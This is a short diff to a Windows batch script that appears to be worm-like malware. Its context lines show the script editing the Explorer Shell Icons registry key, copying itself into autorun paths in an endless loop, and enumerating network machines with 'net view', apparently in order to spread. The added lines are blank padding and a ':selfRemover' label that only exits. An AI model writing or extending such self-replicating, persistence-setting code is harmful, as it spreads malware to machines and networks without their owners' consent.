@@ -83,6 +83,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 
+
+
 :cycle
 copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
@@ -161,4 +163,14 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
 )
 
 timeout /nobreak /t 5 >nul
+call :selfRemover
 goto :cycle
+
+
+
+
+
+
+
+:selfRemover
+exit /b
